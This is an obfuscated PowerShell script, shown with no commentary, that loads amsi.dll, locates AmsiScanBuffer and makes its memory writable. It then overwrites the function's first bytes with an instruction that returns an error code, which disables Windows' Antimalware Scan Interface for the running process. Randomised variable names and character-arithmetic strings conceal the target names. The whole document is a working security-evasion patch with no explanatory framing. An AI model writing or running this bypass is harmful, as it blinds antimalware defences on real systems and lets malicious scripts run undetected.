$ZNeW8djPR = @"
using System;
using System.Runtime.InteropServices;
public class ZNeW8djPR {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr P26A, string BURXF);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr TUsnQ2_7h, UIntPtr Tg9gW8i349bgIK8l, uint ZvOFF0V2EmKKo, out uint NjBmp);
}
"@

Add-Type $ZNeW8djPR

$c954pII4A = [ZNeW8djPR]::LoadLibrary("$([cHaR](4+93)+[cHar]([byTE]0x6d)+[cHAR](29+86)+[ChAR]([ByTe]0x69)+[char]([bYTE]0x2e)+[cHAR]([bYte]0x64)+[cHAR](108*43/43)+[chaR](108))")
$WFLK0WcI_Wxnr6Q = [ZNeW8djPR]::GetProcAddress($c954pII4A, "$([ChaR](65)+[CHar]([bYTE]0x6d)+[chAr](115+94-94)+[char](33+72)+[ChaR](83*24/24)+[ChAr](92+7)+[chAr](1+96)+[Char](110)+[cHar]([BYte]0x42)+[chaR](117+34-34)+[Char](83+19)+[ChAr](15+87)+[CHAr]([BYtE]0x65)+[ChaR](114+7-7))")
$p = 0
[ZNeW8djPR]::VirtualProtect($WFLK0WcI_Wxnr6Q, [uint32]5, 0x40, [ref]$p)
$vb9MgX = "0xB8"
$O6pHVSDldmjGw = "0x57"
$cZKtvi = "0x00"
$xFep = "0x07"
$YaOgzF0ffHMXByYb = "0x80"
$cpGyiJNbt0Ds = "0xC3"
$F7L = [Byte[]] ($vb9MgX,$O6pHVSDldmjGw,$cZKtvi,$xFep,+$YaOgzF0ffHMXByYb,+$cpGyiJNbt0Ds)
[System.Runtime.InteropServices.Marshal]::Copy($F7L, 0, $WFLK0WcI_Wxnr6Q, 6)